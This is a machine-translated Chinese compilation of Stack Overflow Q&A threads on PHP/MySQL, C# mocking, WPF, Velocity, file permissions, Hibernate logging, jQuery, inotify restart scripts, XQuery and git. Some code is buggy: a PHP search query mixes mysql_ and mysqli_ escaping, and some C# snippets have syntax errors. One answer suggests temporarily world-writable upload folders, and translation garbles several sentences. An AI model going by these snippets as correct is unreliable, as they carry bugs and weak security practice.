// now you got all the records but you still need to iterate over this result
$result = mysql_query($query, $conn);
$array = array();

  // retrieve a record and append it to the array
 while($record = mysql_fetch_assoc($result)):
   $array[] = $record;

 endwhile;

// please close the door.... 
 mysql_close($conn);
  echo json_encode($array); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:16:03.917

有关连接到 MySQL 和搜索的基本实现，请参见下文`$q`，我为您留下了一些评论，以使您更清楚发生了什么！

```
<?php

// Get the query term from the url
$q = strtolower($_GET["q"]);

// Do nothing if it's empty or not set
if (empty($q)) return;

// Result array which we are going to get from MySQL
$result= array();

// Make a SQL Connection
mysql_connect("localhost", "admin", "password") or die(mysql_error());

// Try to connect to your DATABASE (change the name) or throw an error
mysql_select_db("DATABASE") or die(mysql_error());

// Get data from the "email" table 
// Where the name field is LIKE the search term
$result = mysql_query("SELECT * FROM email WHERE name LIKE '%".mysqli_real_escape_string($q)."%'") 
or die(mysql_error());  //throw an error if something went wrong

//Read all the results ($row) in a loop and put them in the result array
while($row = mysql_fetch_array( $result )) {
    $result[] = array('name' => $row['name'], 'to' => $row['to']);
} 

// Output the array as JSON
echo json_encode($result);

?> 
```

*对于 PHP 经验丰富的人，我知道您可以从 MySQL 获取一个数组，但为了使其更清晰，将其保留为这样。*

* * *

启用错误报告

```
ini_set('display_errors', 1);
error_reporting(E_ALL); 
```

# c# - 检查是否使用 Moq 调用了 CancellationTokenSource.Cancel()

> ID：12264219
> 
> 赞同：4
> 
> 时间：2012-09-04T13:11:26.923
> 
> 标签：c#, c#-4.0, moq, task-parallel-library, cancellationtokensource

我有一个条件语句，应该如下所示：

```
//...
if(_view.VerifyData != true)
{
    //...
}
else
{
    _view.PermanentCancellation.Cancel();
} 
```

其中 PermanentCancellation 是 CancellationTokenSource 类型。

我想知道我应该如何在我的 _view 模拟中设置它。到目前为止所有的尝试都失败了:(而且我在谷歌上找不到一个例子。

任何指针将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:29:38.477

因为[CancellationTokenSource.Cancel](http://msdn.microsoft.com/en-us/library/dd321955.aspx)不是虚拟的，所以不能用 moq 模拟它。

你有两个选择：

创建一个包装接口：

```
public interface ICancellationTokenSource
{
    void Cancel();
} 
```

以及委托给包装的 CancellationTokenSource 的实现

```
public class CancellationTokenSourceWrapper : ICancellationTokenSource
{
    private readonly CancellationTokenSource source;

    public CancellationTokenSourceWrapper(CancellationTokenSource source)
    {
        this.source = source;
    }

    public void Cancel() 
    {
        source.Cancel();
    }

} 
```

并使用`ICancellationTokenSource`as然后您可以在测试`PermanentCancellation`中创建一个：`Mock<ICancellationTokenSource>`

```
// arrange

var mockCancellationTokenSource = new Mock<ICancellationTokenSource>();
viewMock.SetupGet(m => m.PermanentCancellation)
        .Returns(mockCancellationTokenSource.Object)

// act

// do something

// assert

mockCancellationTokenSource.Verify(m => m.Cancel()); 
```

并`CancellationTokenSourceWrapper`在您的生产代码中使用。

或者使用支持模拟非虚拟成员的模拟框架，例如：

*   [微软假货](http://msdn.microsoft.com/en-us/library/hh549175.aspx)
*   [Typemock 隔离器](http://www.typemock.com/isolator-product-page)（商用）
*   [JustMock](http://www.telerik.com/products/mocking.aspx)（商业）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2022-01-18T15:49:09.093

我更进一步，`factory`创建了一个`CancellationTokenManager`实现接口的类。这是因为我的方法必须采用`CancellationToken`并且我想要精细控制`.IsCancellationRequested()`：

我的`CancellationTokenManagerFactory`：

```
public interface ICancellationTokenManagerFactory
{
  ICancellationTokenManager CreateManager(CancellationToken token);
}

public class CancellationTokenManagerFactory : ICancellationTokenManagerFactory
{
  public ICancellationTokenManager CreateManager(CancellationToken token)
  {
    return new CancellationTokenManager(token);
  }
} 
```

和经理：

```
public interface ICancellationTokenManager
{
  bool IsCancellationRequested { get; }

  CancellationToken CancellationToken { get; }
}

public class CancellationTokenManager : ICancellationTokenManager
{
  private readonly CancellationToken _token;

  public CancellationTokenManager(CancellationToken token)
  {
    _token = token;
  }

  public bool IsCancellationRequested
  {
    get
    {
      return _token.IsCancellationRequested;
    }
  }

  public CancellationToken CancellationToken => _token;
} 
```

然后在课堂上使用：

```
public class MyService
{
  private readonly ICancellationTokenManagerFactory _factory = factory;
  public MyService(ICancellationTokenManagerFactory factory)
  {
    _factory = factory;
  }

  public void StartAsync(CancellationToken token)
  {
    manager = _factory.CreateManager(token);

    //check if cancelled
    if (!manager.IsCancellationRequested())
    }
      // do some work
    }
  }
} 
```

现在，如果我多次检查取消请求，我可以每次都模拟不同的响应。此外，任何类似的接口`IHostService`仍然可以使用，因为`CancellationToken`它是传入的，尽管该令牌中的内容不一定重要。

# .net - Windows phone WebBrowser 控件嵌入字体

> ID：12264221
> 
> 赞同：0
> 
> 时间：2012-09-04T13:11:31.757
> 
> 标签：.net, windows-phone-7, webbrowser-control

将字体嵌入到 Windows 手机应用程序非常容易，但我找不到在 WebBrowser 控件中使用我的字体的方法，即显示静态 html 文件。有什么办法吗？

我正在使用下面的代码来显示我的 html 文件：

```
 Uri uri = new Uri(AppResources.red_termsOfUse_URI, UriKind.Relative);
        Stream stream = Application.GetResourceStream(uri).Stream;
        using (StreamReader reader = new StreamReader(stream, new System.Text.UnicodeEncoding()))
        {
            string htmlDocument = reader.ReadToEnd();
            this.webBrowser.NavigateToString(htmlDocument);
        } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:28:32.243

webBrowser 控件将使用页面的 css（或样式元素）中定义的字体显示页面。（它不会使用嵌入式字体）

您可以使用 Javascript 在运行时设置字体，或者您可以在 HTML 文件本身中定义所需的字体（如果文件在您的控制之下）。

要了解有关**在 WP7 WebBrowser 控件中注入 JavaScript 的**更多信息，请阅读[此](https://stackoverflow.com/questions/8348503/how-to-inject-javascript-in-the-wp7-webbrowser-control)。

**编辑：**
如果您有权访问，`css`那么您也可以尝试使用嵌入字体（与我们在任何 HTML 页面中所做的相同）。

```
(Not tested)
@font-face {
    font-family: your_font;
    src: local(your_font), url('fonts/bttf.ttf') format('opentype');
} 
```

请参阅此内容以了解[如何与 Asset 一起显示本地 Html 页面](http://transoceanic.blogspot.in/2011/07/wp7-load-local-html-files-and-all.html)。我希望这是有道理的，我现在无法测试它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-17T21:03:45.510

我不得不做类似的事情。我的一位朋友使用 CSS 和 Data Url Scheme 找到了部分建议的解决方案。然后经过一番斗争，我得到了它的工作。

就我而言，我使用 NavigateToString（而不是 Navigate to a Url），但我认为通过一些技巧它可能会起作用

![WebBrowser 中的自定义字体示例](../Images/a39dd8966e693c0c42a93c6dbb9e6136.png)

因为我发现这很棘手，所以我创建了一个包含一些代码示例的博客文章：

这是我的博客文章： [http ://hmadrigal.wordpress.com/2014/03/17/how-embed-fonts-in-windows-phone-8-using-a-webbrowser-control/](http://hmadrigal.wordpress.com/2014/03/17/how-embed-fonts-in-windows-phone-8-using-a-webbrowser-control/)

这是我的代码示例： [https ://github.com/hmadrigal/playground-dotnet/tree/master/MsWinPhone.EmbedFont](https://github.com/hmadrigal/playground-dotnet/tree/master/MsWinPhone.EmbedFont)

干杯，香草

# c# - 通过代码加载和显示JPG图像

> ID：12264222
> 
> 赞同：1
> 
> 时间：2012-09-04T13:11:38.770
> 
> 标签：c#, .net, wpf

我正在尝试使用 WPF 加载和显示图像，但它不起作用。

```
public partial class MainWindow : Window
{
    BitmapImage imgsrc;

    public MainWindow()
    {
        InitializeComponent();

        imgsrc = new BitmapImage();
        imgsrc.BeginInit();
        imgsrc.UriSource = new Uri("c.jpg", UriKind.Relative);
        imgsrc.EndInit();
    }

    protected override void OnRender(DrawingContext drawingContext)
    {
         base.OnRender(drawingContext);
         drawingContext.DrawImage(imgsrc, new Rect(10, 10, 100, 100));
    }
} 
```

c.jpg 文件在项目中并标记为复制到输出。

应用程序运行没有错误，并显示一个白色的空窗口

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:50:44.360

这是[覆盖](http://social.msdn.microsoft.com/forums/en-US/wpf/thread/750e91c2-c370-4f0a-b18e-892afd99bd9b)`OnRender()`. _`Window`

不要从 派生`Window`，`FrameworkElement`而是使用，或者如果您必须使用，请`Window`尝试将背景设置为透明。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T14:12:57.770

从 Window 继承的类上的 OnRender(...) 方法无法正常工作。你可以尝试这样的事情：

在您的 XAML 中

```
<Window x:Class="WpfTestApplication.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:own="clr-namespace:WpfTestApplication"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="MainWindow" Height="350" Width="525">
<Grid>
    <own:MyRect />
</Grid>
</Window> 
```

在这里显示图像的元素（用图像逻辑替换矩形）

```
public class MyRect : Panel
{
    protected override void OnRender(DrawingContext drawingContext)
    {
        SolidColorBrush mySolidColorBrush = new SolidColorBrush();
        mySolidColorBrush.Color = Colors.LimeGreen;
        Pen myPen = new Pen(Brushes.Blue, 10);
        Rect myRect = new Rect(0, 0, 500, 500);
        drawingContext.DrawRectangle(mySolidColorBrush, myPen, myRect);
    }
} 
```

# apache - Apache Velocity + Tomcat：在网络应用程序中手动处理模板

> ID：12264223
> 
> 赞同：0
> 
> 时间：2012-09-04T13:11:45.573
> 
> 标签：apache, tomcat, velocity, customtool

我正在使用带有 Velocity 和 VelocityViewServlet 的 Apache Tomcat。我创建了一个参考 ViewContext 的自定义工具。这一切都很好。

问题是：定位/加载模板并使用提供的参数对其进行处理的最佳方法是什么？

我已经有了通过获得的文件的绝对路径

```
((ViewContext)context).getRequest().getSession().getServletContext().getRealPath("/") 
```

*   我必须实例化 VelocityEngine 吗？我想 Velocity 没有全局维护（VelocityViewServlet）
*   哪种（以及如何）最适合使用 Velocity 装载机？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-13T13:22:08.757

这里有几点：

*   VelocityViewServlet 将自己实例化一个 VelocityEngine。它不是全局的，它是每个 ServletContext 一个引擎。

*   VelocityViewSerlet 将使用其默认加载器 (WebappLoader) 为自己定位与请求 URI 对应的模板，因此您也不必自己做。

*   您的模板将用于评估的 Velocity 上下文已经填充了所有标准工具（对于工具 2.0），其中 $params 允许您检查 HTTP 参数。

*   我不理解“引用 ViewContext 的自定义工具”：您应该在[此处列出](http://velocity.apache.org/tools/releases/2.0/creatingtools.html#Standard_Tool_Properties)的属性中将所需的所有适当设置器添加到自定义工具中，而不是使用 ViewContext （例如，如果您需要访问请求，然后您将声明一个“公共 setRequest(HttpServletRequest request)”方法）。请记住，从自下而上的角度来看，您的工具必​​须只能通过您在工具配置文件中为其选择的密钥访问，并且不应该知道 Velocity。

*   我建议你使用 VelocityTools 2.0，它是一个比 1.x 更成熟的库。

# java - 将 Office 文档转换为 PDF 或图像的好选择是什么

> ID：12264227
> 
> 赞同：9
> 
> 时间：2012-09-04T13:12:02.783
> 
> 标签：java, pdf, ms-office, file-conversion

`JODConverter, Apache POI, docx4j`基本上，我想知道的是，除了将 Office 文档转换为`docx,doc,xls,xlsx,odt..`格式`PDF`之外，还有没有更好的开源选项。我已经尝试了所有这些选项，它适用于更小和更简单的文件。如果文档包含未正确转换的字段、对象、表格等。这些工具论坛都不是活跃的。如果可能的话，我们只需要使用 Java。有人有更好的建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-24T16:34:02.790

我们提供开源和闭源办公文档转换器。Apache POI 是我们发现的最好的开源办公文档转换器。Apache POI 也很[活跃](http://markmail.org/search/?q=apache%20poi#query%3aapache%20poi%20list%3Aorg.apache.poi.dev%20date%3A201209%20+page:1+state%3afacets)。我们已经成功地自己修复了错误，获得了开发人员对有据可查的测试用例/失败的关注，以及聘请了项目的提交者来快速修复/更新我们需要的东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-29T10:29:36.977

我最近使用过[XDocReport](http://code.google.com/p/xdocreport/)。他们支持从 docx 到 pdf 的转换器（[在此处解释](http://code.google.com/p/xdocreport/wiki/DocxReportingJavaMainConverter)）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-23T09:29:01.110

这样做的商业图书馆是[http://www.aspose.com/java/total-component.aspx](http://www.aspose.com/java/total-component.aspx)

相当不错-我使用的是旧版本（尚未查看其最新更新版本）。

# php - 告诉PHP将文件保存到该文件夹 时的文件夹权限？

> ID：12264228
> 
> 赞同：2
> 
> 时间：2012-09-04T13:12:04.250
> 
> 标签：php, upload, permissions

我正在尝试使用此[Dagon Design PHP](http://www.dagondesign.com/articles/secure-php-form-mailer-script/all-comments/#comments)表单来帮助当地的非营利出版物使他们的读者能够提交照片。我的“邮件程序”部分正常工作——通知工作正常——但“将文件保存到文件夹”部分不起作用。

在表单页面上，作者说“该目录必须具有写入权限”，但我不确定“谁”正在写入该文件夹 - 当这个 PHP 脚本在我的网站上保存某些内容时，它是否被视为“所有者”？或者我是否需要允许所有者、组和其他人的保存权限？

我不确定为什么脚本没有保存照片，但这似乎是一个不错的起点。我[试过在 Stack 上](https://stackoverflow.com/questions/7372891/php-folder-permissions-problem) [四处](https://stackoverflow.com/questions/2994107/php-and-permissions?rq=1)[寻找](https://stackoverflow.com/questions/6630237/folder-permissions-for-php-file-uploads-private-public-shared-views) 答案，但大多数问题似乎都与文件夹创建/权限有关。

如果有帮助，我笨拙地尝试构建的页面就[在这里。](http://www.shep.ca/upload/dd-formmailer.php)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:49:00.940

正如 Jon 已经说过的，你不想让每个人都有写访问权限。

也有可能（取决于托管）正在使用 suEXEC 之类的东西 - 这将导致您的 PHP 脚本以网络服务器以外的用户身份运行*（*如 Dunhamzzz 所报告）。

在我看来，您最好的方法可能是调用 whoami 的脚本：

```
passthru('whoami'); 
```

或者，您可以尝试：

```
var_dump(posix_getpwuid(posix_geteuid())); 
```

请记住，这确实会将系统信息公之于众 - 所以一旦你使用了脚本就删除它！

然后，正如您在问题中正确断言的那样，它可能是文件权限。

如果您确实具有 CLI 访问权限，则可以安全地更新权限（第一个命令获取组）

```
id -n -g <username>
chmod 770 <directory>
chown <username>:<group> <directory> 
```

（您可能必须在上面的“chown”命令前加上“sudo”，或者找到其他方式以“root”身份运行它......，如果遇到困难，请回复。）

如果您无权运行命令行，您可能会通过 (S)FTP 客户端或类似的方式执行此操作。恐怕那时选项会变得有点宽泛，您必须弄清楚（或回复您正在使用的客户！）

一如既往，YMMV。

最后，请记住，如果这是您自己的代码，人们有时会尝试上传 PHP 脚本（或更糟）。如果可以通过公共 URL 访问该目录……那么您将打开最大的安全漏洞！（.htaccess 或非文档根位置是您的朋友。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:14:40.900

如果您不确定您的服务器是如何配置的（这会影响谁是最终的文件所有者），那么将写入权限添加给任何人 ( `chmod a+w folder`)，上传一个文件并`ls -l`查看所有者。然后您可以调整权限以仅允许某些用户进行写访问

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:15:30.443

保存文件的 PHP 脚本以服务器上某些用户帐户的权限运行；具体帐户取决于您的操作系统和 Web 服务器配置。在 Linux 上，当 PHP 作为 Apache 模块运行时，此用户与运行 Apache 的用户相同。

解决您的问题减少到确定我们正在谈论的用户帐户，然后确保该用户有权写入保存目录（作为所有者或作为组的成员；向每个人授予写入权限并不是最好的主意） .

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-04T13:17:29.497

您需要将目录的权限设置为网络服务器（可能是 Apache、nginx 或类似服务器）的权限，因为这就是执行 PHP 的内容。

您可以使用 快速找到 apache 用户`ps aux | grep apache`，然后将上传目录的权限设置为该用户，如下所示：

```
chown -R www-data:www-data images/uploads 
```

# hibernate - 应该避免休眠查询日志记录？

> ID：12264230
> 
> 赞同：1
> 
> 时间：2012-09-04T13:12:11.167
> 
> 标签：hibernate, logging, jboss5.x, jboss-tools

我正在为我的项目使用 JPA ...

我的问题是：`Whenever we are executing some query using the JPA the query is logged in the server.log file of the **JBOSS** .`我正在使用 Jboss log4J。

但我想避免在 server.log 文件中打印查询。在不更改以下属性的情况下：

```
<property name="hibernate.show_sql" value="true"/> 
```

相反，我尝试了：

```
<category name="org.hibernate">
        <priority value="ERROR" />
    </category> 
```

中`log4j.xml` ，即使查询正在控制台或 server.log 中记录以进行成功查询。

谁能帮我解决这个问题……？

我必须在哪里更改配置以避免 server.log 中的查询记录？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:49:54.120

你可能很难做到这一点。

```
<property name="hibernate.show_sql" value="true"/> 
```

确实是一个开发设置，它将生成的 SQL 写入标准输出而不是您的记录器。

看一看`org.hibernate.jdbc.util.SQLStatementLogger`确认。

将 SQL 记录到您配置的日志记录机制是完全不同的事情，并且写入`org.hibernate.SQL`.

因此，为了避免在任何地方编写 SQL，您需要设置：

```
<property name="hibernate.show_sql" value="false"/> 
```

并使用以下日志设置：

```
<category name="org.hibernate">
  <priority value="INFO" />
</category> 
```

# user-interface - IIS Express 图标是什么意思？

> ID：12264231
> 
> 赞同：3
> 
> 时间：2012-09-04T13:12:14.720
> 
> 标签：user-interface, icons, iis-express, system-tray

在 Visual Studio 2012 中使用 IIS Express 作为我的开发服务器，我注意到我的系统托盘中出现了一个看起来很奇怪的银蓝色图标。原来这是 IIS Express 图标，如下图所示（IIS Express 图标在左侧）：

![左侧显示的 IIS Express 图标](../Images/7dc8b31d65ec4bffd69fddac1a6e67b4.png)

这个图标应该代表什么？大约一个星期以来，我一直以为它是一个程式化的 S，现在它看起来更像是一个被机器人手压碎的锡罐。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2014-02-24T14:39:45.537

The icon you mention is the IIS Express System Tray application icon.

If you were to debug or run a Web Site or Web Application from the Visual Studio IDE, this icon will be displayed in your System Tray; you can right-click this icon and gain access to further features to stop these web sites and more.

IIS Express is somewhat similar to the Visual Studio Web Server in that it runs the web site/application under a random port on localhost. IIS Express is beneficial to use because incorporates the main Windows IIS Features without the need of requiring the Windows IIS Feature to be installed on the developer's computer; most corporates don't like to have the Windows IIS Feature installed because it represents a security risk to the company and requires more corporate management.

## References

[http://www.iis.net/learn/extensions/introduction-to-iis-express](http://www.iis.net/learn/extensions/introduction-to-iis-express)

# jquery - JQuery 在页面加载时设置 div 的高度

> ID：12264236
> 
> 赞同：0
> 
> 时间：2012-09-04T13:12:36.470
> 
> 标签：jquery, html, height

好的，所以我有一个容器 div 来加载一些由 php 生成的内容。我不知道内容的高度是多少，它是绝对定位的，所以容器 div 在所有内容都存在之前不知道有多高。我收集了它需要在 php 变量中的高度，并想使用 jquery 将容器 div 设置为这个高度，但它还没有工作。

我已将此代码放在页面底部附近：

```
<script type="text/javascript">
$(document).ready(function () {
$("#DynContainer").css({height:<?php echo $containerHeight; ?>px})
});
</script> 
```

它目前无法正常工作，但查看 php 变量正确回显到其中的代码。例如：

```
<script type="text/javascript">
$(document).ready(function () {
$("#DynContainer").css({height:440px})
});
</script> 
```

编辑：

正如许多人建议的那样，我需要为 CSS 提供有效的代码。我已经改变它来生成这个代码：

```
<script type="text/javascript">
$(document).ready(function () {
var containerHeight = "440px";
$("#DynContainer").css({height: containerHeight})
}); 
```

但是它仍然不起作用。ID 参考是正确的。

编辑2：

查看控制台我收到此错误：

```
[15:46:29.460] TypeError: $ is not a function @ http://localhost/serge/?page_id=2045:242 
```

提示 jQuery 没有加载，但它肯定是在页面顶部调用的。这是整个页面代码： http: [//pastebin.com/tGadjaRA](http://pastebin.com/tGadjaRA)

已解决：这是一个无冲突的 jQuery 问题。谢谢大家

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T13:14:30.213

在值周围加上引号，因为它是一个字符串：

```
<script type="text/javascript">
$(document).ready(function () {
$("#DynContainer").css({height:'<?php echo $containerHeight; ?>px'})
});
</script> 
```

[http://jsfiddle.net/mblase75/GF3EK/](http://jsfiddle.net/mblase75/GF3EK/)

或者，删除“px”和引号，以便将其解析为整数（“px”是默认单位）：

```
<script type="text/javascript">
$(document).ready(function () {
$("#DynContainer").css({height:<?php echo $containerHeight; ?>})
});
</script> 
```

[http://jsfiddle.net/mblase75/GF3EK/1/](http://jsfiddle.net/mblase75/GF3EK/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:14:46.653

“px”导致无效的javascript。正如其他答案所建议的那样，您可以在其周围加上引号，也可以完全删除 px：

```
$(document).ready(function () {
    $("#DynContainer").css({height:<?php echo $containerHeight; ?>})
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:17:25.237

我建议在脚本开头将 PHP 变量传递给 JS：

```
<script type="text/javascript">
var containerHeight = <?php echo $containerHeight; ?>;
// from now, it's pure JS. both better maintainable and readable
$(document).ready(function () {
    $("#DynContainer").css({'height': containerHeight})
});
</script> 
```

# linux - Linux中文件更改的重新启动过程

> ID：12264238
> 
> 赞同：26
> 
> 时间：2012-09-04T13:12:41.610
> 
> 标签：linux, shell

是否有一个简单的解决方案（使用常见的 shell 实用程序，通过大多数发行版提供的实用程序，或一些简单的 python/... 脚本）在某些文件更改时重新启动进程？

简单地调用 sth like 会很好`watch -cmd "./the_process -arg" deps/*`。

**更新：** 一个简单的 shell 脚本和建议的 inotify-tools （很好！）符合我的需要（适用于不带参数的命令）：

```
#!/bin/sh
while true; do
  $@ &
  PID=$!
  inotifywait $1
  kill $PID
done 
```

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-09-04T13:14:15.760

*是的，您可以通过inotify*系统使用`inotifywait`或`inotifywatch`从[inotify-tools](https://github.com/rvoicilas/inotify-tools/wiki/)观看目录。

`inotifywait`将在检测到事件时退出。传递选项`-r`以递归方式监视目录。示例：`inotifywait -r mydirectory`。

您还可以指定要观看的事件，而不是观看所有事件。要仅等待文件或目录内容更改，请使用 option `-e modify`。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2016-01-08T08:58:17.393

这是对问题中提供的答案的改进。当一个人中断脚本时，应该终止运行进程。

```
#!/bin/sh

sigint_handler()
{
  kill $PID
  exit
}

trap sigint_handler SIGINT

while true; do
  $@ &
  PID=$!
  inotifywait -e modify -e move -e create -e delete -e attrib -r `pwd`
  kill $PID
done 
```

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2012-09-04T13:14:53.410

签出[`iWatch`](http://iwatch.sourceforge.net/index.html)：

> Watch 是一个实时文件系统监控程序。它是一个检测文件系统变化并立即报告的工具。它使用 XML 格式的简单配置文件，基于 inotify，Linux 内核中的文件变化通知系统。

比，你可以轻松地观看文件：

```
iwatch /path/to/file -c 'run_you_script.sh' 
```

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2019-01-30T22:09:19.633

我发现这非常适合 PO 要求的完整场景：

```
ls *.py | entr -r python my_main.py 
```

另请参阅[http://eradman.com/entrproject/](http://eradman.com/entrproject/)，尽管文档有些奇怪。是的，您需要`ls`匹配您想要匹配的文件模式，并将其通过管道传输到`entr`可执行文件中。它将运行您的程序并在任何匹配的文件更改时重新运行它。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2020-02-03T17:49:56.590

我参与了一个 perl 脚本调用`lrrr`（真的是小重启运行器）。我每天在工作中使用它。

如果您安装了 perl 和 cpanm，则可以安装它`cpanm App::lrrr`，然后按如下方式使用它：

```
lrrr -w dirs,or_files,to-watch your_cmd_here 
```

w 标志标记要监视的文件或目录。目前，如果文件更改，它会终止您运行的进程，但我将很快添加一个功能来切换它。

如果有什么要补充的请告诉我！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-08-11T06:35:42.423

我使用这个“单线”根据文件更改重新启动长时间运行的进程

```
trap 'kill %1' 1 2 3 6; while : ; do YOUR_EXE & inotifywait -r YOUR_WATCHED_DIRECTORY -e create,delete,modify || break; kill %1; sleep 3; done 
```

这将启动进程，将其输出保持到同一个控制台，观察变化，如果有变化，它将关闭进程，等待三秒钟（进一步在同一秒内写入或进程关闭时间），然后执行又是上述。
ctrl-c 和 ssh-disconnect 将受到尊重，完成后该过程将退出。

为了易读性：

```
trap 'kill %1' 1 2 3 6
while :
do
    YOUR_EXE &
    inotifywait \
        -r YOUR_WATCHED_DIRECTORY \
        -e create,delete,modify \
    || break
    kill %1
    sleep 3
done 
```

例如对于 package.json-ran 项目

```
"module"          : "./dist/server.mjs",
"scripts"         : {
    "build"  : "cd ./src && rollup -c ",
    "watch"  : "cd ./src && rollup -c -w",
    "start"  : "cd ./dist && node --trace-warnings --enable-source-maps ./server.mjs",
    "test"   : "trap 'kill %1' 1 2 3 6; while : ; do npm run start & inotifywait -r ./dist -e create,delete,modify || break; kill %1; sleep 3; done"
},
"dependencies"    : { 
```

现在，您可以在一个活动中运行`npm run watch`（从 src 编译到 dist），在另一个活动中运行`npm run test`（服务器运行器和重启程序），当您编辑`./src`文件时，构建器进程将更新`./dist`，服务器将重新启动以供您测试。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-10-12T17:26:47.163

我需要一个生成子进程的 golang`go run`命令的解决方案。所以结合上面的答案和[pidtree](https://superuser.com/a/784102/524394)给了我这个脚本。

```
#!/bin/bash

# go file to run
MAIN=cmd/example/main.go

# directories to recursively monitor
DIRS="cmd pkg"

# Based on pidtree from https://superuser.com/a/784102/524394
pidtree() {
  declare -A CHILDS
  while read P PP; do
    CHILDS[$PP]+=" $P"
  done < <(ps -e -o pid= -o ppid=)

  walk() {
    echo $1
    for i in ${CHILDS[$1]}; do
      walk $i
    done
  }

  for i in "$@"; do
    walk $i
  done
}

sigint_handler()
{
  kill $(pidtree $PID)
  exit
}

trap sigint_handler SIGINT

while true; do
  go run $MAIN &
  PID=$!
  inotifywait -e modify -e move -e create -e delete -e attrib -r $DIRS

  PIDS=$(pidtree $PID)
  kill $PIDS

  wait $PID
  sleep 1
done 
```

# java - 使用 Selenium webdriver 的模态页面自动化

> ID：12264239
> 
> 赞同：2
> 
> 时间：2012-09-04T13:12:41.660
> 
> 标签：java, modal-dialog, selenium-webdriver

我正在为 WebAutomation 使用 Java 和 selenium webdriver。场景就像，当我们单击特定选项时，新的模态页面被打开。但是，在 Webdriver 的帮助下，当我单击该特定选项时，模式页面没有打开。请建议我如何做到这一点

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-13T11:46:19.040

似乎**Click()**没有发生在打开模式页面的*特定选项上*

# xquery - xquery-如何在使用 FLWOR 表达式通过单个查询获取多个记录时分配一个数字（按顺序）

> ID：12264241
> 
> 赞同：0
> 
> 时间：2012-09-04T13:12:47.460
> 
> 标签：xquery, flwor

在尝试从 XML 文档处理和获取数据时，我想使用单个 FLWOR 表达式来获取一些记录——我通过使用“let”子句来获取数据来做到这一点——所以我有一些行数据。

例如。

```
<div id="main">
    <p> Text #1</p>
    <p> Text #2</p>
    <p> Text #3</p>
    <p> Text #4</p>
</div> 
```

现在，我了解了如何获取 4 个“p”元素——但是我还想为每一行分配一个序列号——即。我想通过这种方式获取文本——

```
 <data>Text #1</data><sequence> Sequence #1</sequence>
 <data>Text #2</data><sequence> Sequence #2</sequence>
 <data>Text #3</data><sequence> Sequence #3</sequence>
 <data>Text #4</data><sequence> Sequence #4</sequence> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:29:42.193

虽然我不完全确定该`<sequence/>`元素的字符串值，但一种解决方案可能如下所示：

```
for $p in <div id="main">
  <p>Text #1</p>
  <p>Text #2</p>
  <p>Text #3</p>
  <p>Text #4</p>
</div>/p
return (
  <data>{ $p/text() }</data>,
  <sequence>Sequence { replace($p, 'Text ', '') }</sequence>
) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T14:11:30.447

您可以在*FLWOR*表达式的[子句](http://www.w3.org/TR/xquery-30/#id-xquery-for-clause)`at`中使用关键字：*[`for`](http://www.w3.org/TR/xquery-30/#id-xquery-for-clause)*

 *```
declare variable $div :=
  <div id="main">
      <p> Text #1</p>
      <p> Text #2</p>
      <p> Text #3</p>
      <p> Text #4</p>
  </div>;

for $p at $pos in $div/p
return (
  <data>{$p/text()}</data>,
  <sequence>Sequence #{$pos}</sequence>
) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T14:43:43.503

肯定有比这样更优雅的方式......但它有效：

```
let $t := <div id="main">
  <p>Text A</p>
  <p>Text B</p>
  <p>Text C</p>
  <p>Text D</p>
</div>
for $pos in $t/p/position()
let $p := $t/p[$pos]
return (
  <data>{ $p/text() }</data>,
  <sequence>Sequence { $pos }</sequence>
) 
```*

# git - “git push --mirror”删除了远程标签。有什么办法可以恢复它们？

> ID：12264242
> 
> 赞同：6
> 
> 时间：2012-09-04T13:12:50.587
> 
> 标签：git, push, restore, mirror

在跳回答之前，请仔细阅读这个烂摊子！

**问题：**

1.  我正在开发一个项目（使用 git 进行版本控制）。
2.  我创建了标签 v2.x 并将其推送到我的远程*源*。
3.  这个远程源是一个私有镜像，在 1.x 系列中没有标签。**原因**- 我们在 v2.x 中从头开始编码，因此仅出于历史原因维护 1.x。
4.  没有意识到这一点，我在我们的公共 github 存储库中添加了另一个遥控器。
5.  我想让镜像最新的标签并提交到 github（因为我是唯一的开发人员 - 我没有费心合并！）

我用了：

```
git push --mirror 
```

它从 Github 中删除了 1.x 系列中的所有标签！

**现在的情况：**

*   我搜索了很多，阅读了 git 手册。尝试运行 git reflog/reset/rebase 但无法恢复任何内容。
*   我当地的环境。没有与标签 1.x 相关的提交，因为我们在 2.x 中从头开始
